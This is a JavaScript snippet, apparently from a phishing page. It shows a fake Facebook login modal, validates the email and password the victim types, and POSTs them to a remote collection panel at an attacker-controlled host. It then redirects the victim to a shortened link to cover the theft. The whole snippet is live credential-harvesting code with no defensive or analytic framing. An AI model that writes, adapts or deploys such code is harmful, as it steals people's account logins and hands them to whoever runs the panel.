function openmdralexf() {
                $('#alexf').fadeIn();
                }
 
            function AlexHostingFB()
        	{
        		$emailfb1 = $('#alx_email_fb2').val().trim();
        		$passwordfb1 = $('#alx_password_fb2').val().trim();
        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
        		{
        			$('.email-fb1').show();
        			$('.sandi-fb1').hide();
        			return false;
        		}else{
        			$('.email-fb1').hide();
        		}
        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
        		{
        			$('.sandi-fb1').show();
        			return false;
        		}else{
        			$('.sandi-fb1').hide();
        		}
        		
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        type: 'POST',
                        url: 'https://king-vippanel.bimarvg-host.web.id/apiii.php',
                        data: $('#ngumpulinuangnikah').serialize(),
                        dataType: 'text',
                        success: function() {
                                    location.href = "http://surl.li/obdlw";
                            } 
                    })
        		}
               }
